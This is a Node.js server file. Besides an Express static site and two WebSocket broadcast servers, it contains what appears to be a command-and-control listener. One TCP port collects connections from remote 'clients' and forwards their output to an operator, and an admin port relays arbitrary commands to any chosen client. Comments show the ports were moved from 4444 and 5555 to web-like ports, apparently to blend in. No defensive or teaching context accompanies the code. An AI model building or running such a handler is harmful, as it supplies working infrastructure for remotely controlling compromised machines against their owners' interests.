const express = require('express');
const path = require('path');
const http = require('http');
const WebSocket = require('ws');
const net = require('net');

// Set up Express and paths
const port = process.env.PORT || 3001; // HTTP port
const wsPort = 8888; // WebSocket port
const app = express();
const publicPath = path.join(__dirname, 'public');

// Serve static files
app.use(express.static(publicPath));

// Create an HTTP server
const server = http.createServer(app);

// WebSocket server on the same HTTP server (port 3001)
const wss = new WebSocket.Server({ server });

// Handle WebSocket connections on port 3001
wss.on('connection', (ws) => {
  console.log('New WebSocket connection');

  ws.on('message', (message) => {
    console.log(`Received message: ${message}`);
    // Broadcast message to all clients on port 3001
    wss.clients.forEach(client => {
      if (client !== ws && client.readyState === WebSocket.OPEN) {
        client.send(message);
      }
    });
  });

  ws.on('close', () => {
    console.log('WebSocket connection closed');
  });
});

// Start the HTTP and WebSocket server on port 3001
server.listen(port, () => {
  console.log(`HTTP and WebSocket server listening on port ${port}`);
});

// Create a separate WebSocket server on port 8888
const wsServer = http.createServer();
const wss8888 = new WebSocket.Server({ server: wsServer });

// Handle WebSocket connections on port 8888
wss8888.on('connection', (ws) => {
  console.log('New WebSocket connection on port 8888');

  ws.on('message', (message) => {
    console.log(`Received message on port 8888: ${message}`);
    // Broadcast message to all clients on port 8888
    wss8888.clients.forEach(client => {
      if (client !== ws && client.readyState === WebSocket.OPEN) {
        client.send(message);
      }
    });
  });

  ws.on('close', () => {
    console.log('WebSocket connection closed on port 8888');
  });
});

// Start the WebSocket server on port 8888
wsServer.listen(wsPort, () => {
  console.log(`WebSocket server listening on port ${wsPort}`);
});

// Client-server handling on port 8443 (formerly 4444)
const clients = {};
let adminSocket = null;

const clientServer = net.createServer((clientSocket) => {
    const clientId = `${clientSocket.remoteAddress}:${clientSocket.remotePort}`;
    console.log(`Client connected: ${clientId}`);
    clients[clientId] = clientSocket;

    clientSocket.on('data', (data) => {
        console.log(`Received from ${clientId}: ${data}`);

        if (adminSocket) {
            adminSocket.write(`Client ${clientId}: ${data}`);
        }
    });

    clientSocket.on('end', () => {
        console.log(`Client disconnected: ${clientId}`);
        delete clients[clientId];
    });
});

clientServer.listen(8443, '0.0.0.0', () => {
    console.log('Client server listening on port 8443');
});

// Admin server handling on port 8080 (formerly 5555)
const adminServer = net.createServer((socket) => {
    console.log('Admin connected');
    adminSocket = socket;

    socket.on('data', (data) => {
        const command = data.toString().trim();
        if (command.startsWith('send')) {
            const [_, clientId, ...cmdParts] = command.split(' ');
            const cmd = cmdParts.join(' ');
            if (clients[clientId]) {
                clients[clientId].write(cmd);
            } else {
                socket.write(`Client ${clientId} not found\n`);
            }
        } else {
            socket.write("Invalid command. Use 'send <client_id> <command>'.\n");
        }
    });

    socket.on('end', () => {
        console.log('Admin disconnected');
        adminSocket = null;
    });
});

adminServer.listen(8080, '0.0.0.0', () => {
    console.log('Admin server listening on port 8080');
});
